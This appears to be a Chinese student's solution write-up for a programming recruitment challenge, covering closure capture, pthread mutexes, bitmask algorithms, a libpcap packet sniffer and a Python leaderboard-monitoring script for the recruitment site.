incoming: incoming % value, g) 而在同一个作用域下，value的值始终针对同一个变量在变化，而不是每次循环都创建一个新变量。因此，所有的lambda中引用的value都会使用最新的值。 可以采用默认参数的方法解决这个问题。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming, value=value: incoming % value, g) print(value)except StopIteration: pass 这样，参数只会初始化一次，而在之后的循环中保持不变。 手动即时捕获。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter((lambda value: lambda incoming: incoming % value)(value), g) print(value)except StopIteration: pass 而JavaScript是与var的作用域规则有关。var在JavaScript中的作用域是函数作用域，而不是块作用域。循环体中每次声明的value实际上会在整个函数的作用域中共享，lambda函数捕获的是对同一个变量的引用，所以value会在每次循环后更新。 可以使用 let 代替 var。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { let {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 因为 let 是块作用域，在每次循环中会为 value 绑定一个新的变量，这样每个 lambda 函数都能捕获到当前循环中的 value，而不是共享的全局变量。 ⭐数数 计算机往往不够聪明（或者太过聪明），以至于他只会完全按照你的指令办事，尽管有时候你自己都不知道自己的指令是什么含义 CH1这道题目并不难，你要做的只是让计算机学会数数而已。 比如： 123456789101112131415161718192021222324252627#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); int counter; worker(&amp;counter); worker(&amp;counter); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 十分简单对吧？但是柳苏明却认为，让同一个 worker函数运行两遍效率太低了。为什么不雇佣两个 worker， 让他们同时工作呢？换句话说，他决定使用 多线程！ 于是他十分好心的给了你两份代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// V1#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter1, counter2; pthread_create(&amp;thread1, NULL, worker, &amp;counter1); pthread_create(&amp;thread2, NULL, worker, &amp;counter2); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter1 + counter2); return 0;}//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 但问题出现了，尽管第一份代码可以正常运行，但第二份代码在 输入值很大 时总是出现奇怪的偏差。 尝试运行测试这两段代码，回答： 为什么两份相似的代码会有不同的输出结果？ V1中每个线程独立地操作各自的counter1和counter2，互不干扰，最终把两个计数器的结果加和得到答案。 V2中通过多线程并发地对同一变量counter进行修改，这种操作存在竞争条件。意味着两个线程可能同时读写共享变量counter，导致计数不准确，尤其是在工作负荷较大的时候。 在编写多线程代码时，如何避免这种错误？ 引入同步机制，使用互斥锁来保证线程的独立访问，确保在同一时刻只有一个线程可以操作变量，避免竞争条件。 尝试只修改 worker 函数来使第二份代码输出正确。 123456789101112131415161718192021222324252627282930313233343536//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load; pthread_mutex_t lock; //锁的声明void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { pthread_mutex_lock(&amp;lock); //上锁 (* (int *)counter_ptr) += 1; pthread_mutex_unlock(&amp;lock); //解锁 } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_mutex_init(&amp;lock, NULL); //锁的初始化 pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); pthread_mutex_destroy(&amp;lock); //销毁 printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 运行一下，对比更改前后： 1234567$ ./countgive the workload per thread: 1000000000Totally count: 1007291379#------------------------------------------#$ ./countgive the workload per thread: 1000000000Totally count: 2000000000 CH2了解”互斥锁”这个概念，思考： 两个线程都同时访问了同一个变量：互斥锁 对于互斥锁的访问难道不会产生数据竞争吗？ 回答: 为什么访问互斥锁不会产生数据竞争？ 请尝试自己编写一个互斥锁(额外加分) 【操作系统】锁的实现 当一个线程获取互斥锁时，其他线程尝试获取必须等待，直到当前线程释放锁。互斥锁的实现由底层硬件或操作系统支持，通常通过某种原子操作，当一个线程访问其他线程持有的锁时，会被 OS 调度为阻塞状态（休眠），直到锁被释放后，再唤醒一个休眠的线程。 （另外，自旋锁是一种忙等待锁。它在锁被其他线程持有时不会阻塞当前线程，而是不断地尝试获取锁，直到锁可用为止。这种忙等待的行为称为“自旋”。） 使用了原子操作来实现互斥锁的加锁和解锁逻辑。 1234567891011121314151617typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield() //挂起，而非忙等待 } }void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);} 完整代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdatomic.h&gt;#include &lt;sched.h&gt;typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield(); }}void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}int work_load;my_mutex_t my_mutex;void *worker(void *counter_ptr) { for (int i = 0; i &lt; work_load; i++) { my_mutex_lock(&amp;my_mutex); (*(int *)counter_ptr) += 1; my_mutex_unlock(&amp;my_mutex); } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter = 0; my_mutex_init(&amp;my_mutex); pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 📟BitterCH112345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define BOARD_SIZE 8int upper_lim = 1;int count = 0;/** int row: store the valid bit after applying the vertical rule* int ld: store the valid bit after applying the left diagram rule* int rd: store the valid bit after applying the right diagram rule* bit '0' represent where we can place a chess*/void solve_problem(int row ,int ld, int rd) { if( row == upper_lim) { count += 1; return ; } /* 'current' represent all the valid bit*/ int current = upper_lim &amp; (~ (row | ld | rd)); int buffer = current; while(buffer) { int valid = buffer &amp; (-buffer); buffer -= valid; solve_problem(row|valid, (ld|valid)&lt;&lt;1, (rd|valid)&gt;&gt;1); /////////////////////////////////////// }}/* board_size shouldn't be too large */void find_n_th_queen(int board_size ) { upper_lim = (1 &lt;&lt; board_size) - 1; solve_problem(0, 0, 0);}int main() { find_n_th_queen(BOARD_SIZE); printf(&quot;Answer: %d&quot;, count);}// Answer: 92 CH2用位来标记数组元素的状态。 1234567891011121314151617181920212223242526def solve(nums): n = len(nums) states = 1 &lt;&lt; n max_sum = 0 for state in range(states): valid = True curr_sum = 0 for i in range(n): if state &amp; (1 &lt;&lt; i): #choose ith element curr_sum += nums[i] if i &gt; 0 and (state &amp; (1 &lt;&lt; (i - 1))): #conflict valid = False break if valid: max_sum = max(max_sum, curr_sum) return max_sumnums = [1, 15, 3, 7, 12, 10, 19, 8, 5, 17, 2, 6, 11, 9, 4, 14, 13, 18, 16, 20]print(solve(nums))'''130[Done] exited with code=0 in 0.965 seconds''' 动态规划可以显著降低时间。 加密算法：AES中存在行移位，哈希算法会使用位移、异或操作，提供安全性 快速运算：位移操作快速计算，奇偶判断，节约时间，bitset筛素数可节省空间 文件权限：使用位运算可以方便地开启或关闭某些标志位 并行计算：位运算可以快速地启用或禁用某个线程或者检查某个线程的状态 🎩顺手牵羊要求：使用C语言实现一个自己的抓包软件 使用libpcap库实现抓包。 程序应该实现：判断并输出每个包的类型，包的长度，以及包的源地址和目的地址。 如果你能实现对于TCP包的捕获，可以获得70%的分数。如果你能实现至少三种包的分析捕获，可以获得剩下30%的分数。 简单阐述下你对抓包的实现原理的理解，最高可得额外的20%分数。 hint：要不下载一个wireshark体验下抓包？ 题解： 在C语言中使用libpcap库来进行抓包操作。 安装libpcap库； 1sudo apt install libpcap-dev 实现对TCP包的捕获； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt; //提供了IP地址的转换函数#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt; //定义了IP和TCP头部的结构体// 回调函数在每次捕获到数据包时被调用void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); //跳过以太网帧头(14)、获取ip头 struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header-&gt;ip_hl * 4); //获取TCP头 printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header-&gt;ip_hl * 4); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header-&gt;th_off * 4); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4)); printf(&quot;---------------------------------------\\n&quot;);} //三个参数分别表示：用户传递的数据、数据包头部信息、指向实际的数据包内容int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; // 调用函数获取所有可用设备列表 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 选择第一个设备 device = alldevs; printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); pcap_loop(handle, 0, packet_handler, NULL); //捕获数据包，回调 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 编译运行上述代码，打开firefox，捕获到数据包： 1234567891011121314$ gcc -o packet_sniffer packet_sniffer -lpcap$ sudo ./packet_snifferUsing device: loopback0&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 1514 bytesExpected packet size: 1514 bytesIP header length (IHL) in bytes: 20Source Address: 127.0.0.1Destination Address: 127.0.0.1TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 1462 bytes---------------------------------------...... 这些数据包是在 WSL 2 内部通过 loopback 接口进行的本地通信，源头和目的地都是127.0.0.1。查找网络接口： 12345678910$ ip addr...4: loopback0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:15:5d:78:40:b2 brd ff:ff:ff:ff:ff:ff5: eth2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e0:2e:0b:08:09:53 brd ff:ff:ff:ff:ff:ff inet 192.168.0.144/24 brd 192.168.0.255 scope global noprefixroute eth2 valid_lft forever preferred_lft forever inet6 fe80::66a7:f661:86e5:c634/64 scope link nodad noprefixroute valid_lft forever preferred_lft forever 发现eth2是当前唯一状态为 UP 且配置了 IP 地址的接口，是WSL主要用于与外部网络通信的接口。修改代码： 1234567891011121314151617int main() { ... // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } ...} 编译运行结果如下： 1234567891011&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 66 bytesExpected packet size: 66 bytesIP header length (IHL) in bytes: 20Source Address: 192.168.0.144Destination Address: 34.107.243.93TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 14 bytes---------------------------------------... 实现对TCP、UDP和ICMP三种包的捕获： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;netinet/udp.h&gt;#include &lt;netinet/ip_icmp.h&gt;// 回调函数，用于处理捕获的数据包void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); // 跳过以太网头部（Ethernet header） int ip_header_length = ip_header-&gt;ip_hl * 4; printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header_length); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); // 检查IP包的协议字段以确定其类型 switch (ip_header-&gt;ip_p) { case IPPROTO_TCP: { struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header_length); int tcp_header_length = tcp_header-&gt;th_off * 4; printf(&quot;Protocol: TCP\\n&quot;); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + tcp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + tcp_header_length)); break; } case IPPROTO_UDP: { struct udphdr *udp_header = (struct udphdr *)(packet + 14 + ip_header_length); int udp_header_length = 8; // UDP header 固定长度为 8 字节 printf(&quot;Protocol: UDP\\n&quot;); printf(&quot;UDP header length in bytes: %d\\n&quot;, udp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + udp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, ntohs(udp_header-&gt;len) - udp_header_length); break; } case IPPROTO_ICMP: { struct icmphdr *icmp_header = (struct icmphdr *)(packet + 14 + ip_header_length); int icmp_header_length = 8; // ICMP header 通常为 8 字节 printf(&quot;Protocol: ICMP\\n&quot;); printf(&quot;ICMP header length in bytes: %d\\n&quot;, icmp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + icmp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + icmp_header_length)); break; } default: printf(&quot;Protocol: Other\\n&quot;); break; } printf(&quot;---------------------------------------\\n&quot;);}int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; int found = 0; // 使用 pcap_findalldevs 来获取所有可用设备 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); if (handle == NULL) { printf(&quot;Could not open device %s: %s\\n&quot;, device-&gt;name, errbuf); pcap_freealldevs(alldevs); return 1; } // 开始捕获数据包 pcap_loop(handle, 0, packet_handler, NULL); // 释放设备列表 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 运行代码抓包： 123456789101112&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 90 bytesExpected packet size: 90 bytesIP header length (IHL) in bytes: 20Source Address: 185.125.190.57Destination Address: 192.168.0.144Protocol: UDPUDP header length in bytes: 8Size of all headers combined: 28 bytesPayload size: 48 bytes---------------------------------------... 首先找到可用的网络接口，确保抓包工具监听到指定网络接口上的所有数据包；打开网络接口，置于混杂模式（1），以便捕获所有经过该接口的数据包；循环捕获包，调用回调函数，解析IP包头的字段，判断包所使用的传输层协议等等。 libpcap通过操作系统的网络驱动从链路层捕获数据包，将其暂存在内核缓冲区中，然后将数据包传递到用户空间供应用程序分析。 参考内容： C语言如何做抓包 👿busin的野心要求：请你写个程序，自动检测排行榜的变化。具体有如下两个需求： 招新网站的排行榜包含10个招新相关方向以及一个总分方向。如果这11个类别中的任意一个排行的前十名发生了变化，程序就会打印：1.新的前十名排行 2.哪一个人掉出了前十名 3.哪一个人进入了前十名。 程序应该监测特定的题目（使用动态容器的题目可以不被监测）。当有人通过了这个题目后，程序会按照f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;打印出这条信息。 将程序部署在服务器上实现24h运行，并能通过社交软件/邮箱/其他能从移动设备上接收到更新信息的方式，将信息发送到你的移动设备上，实现可视化的管理界面。 (ps:这可能需要一点SA的知识） 题解：首先编写程序rank.py实现打印排名变化情况。 在https://recruit.cnss.io/#/rank上，刷新页面在浏览器控制台网络中找到了fullrank，其通过XHR获取数据，说明排行榜的数据可能是通过该请求动态加载的。于是我们模拟浏览器的请求，**由于Token在随着时间变化，于是添加手动输入Token的部分：** 12345678910111213141516171819202122232425262728293031323334import requestsimport jsondef fetch(url, token): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: print(f&quot;Failed to fetch rankings. HTTP Status Code: {response.status_code}&quot;) print(f&quot;Response content: {response.text}&quot;) return None except requests.exceptions.RequestException as e: print(f&quot;Error fetching rankings: {e}&quot;) return None 主函数流程，记录old_rankings.json文件，fetch得到new_rankings，对新旧排行进行比较，打印信息，更新old_rankings。 12345678910111213141516171819202122232425def main(): url = &quot;https://recruit.cnss.io:8443/v1/fullrank&quot; token = input(&quot;Please enter your access token: &quot;).strip() if not token: print(&quot;Your Token cannot be NULL.&quot;) return try: with open(&quot;old_rankings.json&quot;, &quot;r&quot;) as file: old_rankings = json.load(file) except FileNotFoundError: old_rankings = {} new_rankings = fetch(url, token) if new_rankings: changes = compare(old_rankings, new_rankings) print_changes(changes) with open(&quot;old_rankings.json&quot;, &quot;w&quot;, encoding='utf-8') as file: json.dump(new_rankings, file, ensure_ascii=False, indent=4)if __name__ == &quot;__main__&quot;: main() 下面是compare和print函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def compare(old_rankings, new_rankings): changes = {} for direction, new_top10 in new_rankings.items(): old_top10 = old_rankings.get(direction, []) old_top10_users = [item['Name'] for item in old_top10[:10] if 'Name' in item] new_top10_users = [item['Name'] for item in new_top10[:10] if 'Name' in item] entered = set(new_top10_users) - set(old_top10_users) dropped = set(old_top10_users) - set(new_top10_users) order_changed = old_top10_users != new_top10_users #judge if entered or dropped or order_changed: changes[direction] = { 'new_top10': [{'Name': item['Name'], 'Score': item['Score']} for item in new_top10[:10] if 'Name' in item], 'entered': list(entered), 'dropped': list(dropped), 'order_changed': order_changed } return changesdef print_changes(changes): if not changes: print(&quot;排名未发生变化。&quot;) return for direction, details in changes.items(): print(f&quot;\\n方向: {direction}&quot;) print(&quot;新的前十名排行:&quot;) for rank, user in enumerate(details['new_top10'], start=1): print(f&quot; 名次 {rank}: {user['Name']} (得分: {user['Score']})&quot;) if details['entered']: print(f&quot;进入前十名的人: {', '.join(details['entered'])}&quot;) else: print(&quot;没有新进入前十名的人。&quot;) if details['dropped']: print(f&quot;掉出前十名的人: {', '.join(details['dropped'])}&quot;) else: print(&quot;没有掉出前十名的人。&quot;) if details['order_changed']: print(&quot;前十名内部顺序发生了变化。&quot;) 运行一下，得到输出。 接下来我们编写task.py程序。以一道题为例，我的思路是先在题目tasks那个页面，捕获特定题目的pass_number，当通过人数发生变化时，遍历用户，在passrecord寻找该题的通过者，异步化代码实现如下 Python异步网络编程利器——详解aiohttp的使用教程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import aiohttpimport asyncioimport jsonfrom datetime import datetimeTASK_URL = &quot;https://recruit.cnss.io:8443/v1/tasks/534&quot;PASSRECORD_URL_TEMPLATE = &quot;https://recruit.cnss.io:8443/v1/passrecord/{}&quot;TARGET_TASK_TITLE = &quot;👿busin的野心&quot;USER_ID_RANGE = range(530, 535)SLEEP_INTERVAL = 6previous_pass_number = Noneuser_submissions = {}token = &quot;&quot;async def fetch_pass_number(session): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: async with session.get(TASK_URL, headers=headers) as response: response.raise_for_status() data = await response.json() tasks = data.get('dev', []) for task in tasks: if task.get('title') == TARGET_TASK_TITLE: return task.get('pass_number') except aiohttp.ClientError as e: print(f&quot;获取任务数据时发生异常: {e}&quot;) except Exception as e: print(f&quot;处理任务数据时发生异常: {e}&quot;) return Noneasync def fetch_user_submission(session, user_id): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } url = PASSRECORD_URL_TEMPLATE.format(user_id) try: async with session.get(url, headers=headers) as response: response.raise_for_status() return await response.json() except aiohttp.ClientError as e: print(f&quot;获取用户 {user_id} 的数据时出错: {e}&quot;) except Exception as e: print(f&quot;处理用户 {user_id} 的数据时出错: {e}&quot;) return None 整个函数的逻辑是这样的：通过fetch初始化每个用户（这里是530到535）的提交内容，记录下来，然后每6秒去监测特定题目的通过人数有没有发生变化，一旦发生变化，调用check函数遍历比对，打印出信息。 12345678910111213141516171819async def main(): global token token = input(&quot;请输入Token: &quot;).strip() if not token: print(&quot;Token不能为空。&quot;) return user_ids = USER_ID_RANGE async with aiohttp.ClientSession() as session: await initialize_user_records(session, user_ids) while True: await monitor_pass_number(session, user_ids) await asyncio.sleep(SLEEP_INTERVAL)if __name__ == &quot;__main__&quot;: try: asyncio.run(main()) except KeyboardInterrupt: print(&quot;\\n程序已手动终止。&quot;) 下面我们完善遍历用户，进行初始化用户的提交内容： 12345678910async def initialize_user_records(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, submission in zip(user_ids, submissions): if submission is not None: user_submissions[user_id] = submission print(f&quot;初始记录已保存用户 {user_id}。&quot;) else: print(f&quot;未能获取用户 {user_id} 的初始记录。&quot;) 接着监测特定题目人数并在变化时遍历： 123456789101112131415161718192021222324252627282930313233343536373839404142async def monitor_pass_number(session, user_ids): global previous_pass_number current_pass_number = await fetch_pass_number(session) if current_pass_number is not None: if previous_pass_number is None: previous_pass_number = current_pass_number print(f&quot;初始 pass_number: {current_pass_number}&quot;) elif current_pass_number &gt; previous_pass_number: print(f&quot;pass_number 增加了！新的 pass_number: {current_pass_number}&quot;) await check_user_submission_changes(session, user_ids) previous_pass_number = current_pass_number else: print(f&quot;当前 pass_number: {current_pass_number}&quot;) else: print(&quot;无法获取 pass_number&quot;)async def check_user_submission_changes(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, new_submission in zip(user_ids, submissions): if new_submission is None: continue previous_submission = user_submissions.get(user_id, []) new_tasks = {task['TaskID']: task for task in new_submission} old_tasks = {task['TaskID']: task for task in previous_submission} for task_id, new_task in new_tasks.items(): old_task = old_tasks.get(task_id) if not old_task or old_task.get('Score') != new_task.get('Score'): if new_task.get('TaskTitle') == TARGET_TASK_TITLE: user_name = f&quot;User {user_id}&quot; task_name = new_task.get('TaskTitle') passing_time = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) print(f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;) user_submissions[user_id] = new_submission 运行上述代码，得到输出结果。速度有明显提升。 🤖GPT2目标：你可能已经发现了，你的程序可能并没有我演示的跑的那么快（神机请忽略）。 你的目标就是优化该程序的性能，在保证结果不变的情况下更快的完成文本的补全。 我会使用一些测试点来评测你的程序的正确性和执行时间。期待更高的效率和更多样的优化方案。 此外，请在 wp 中回答下面的问题： 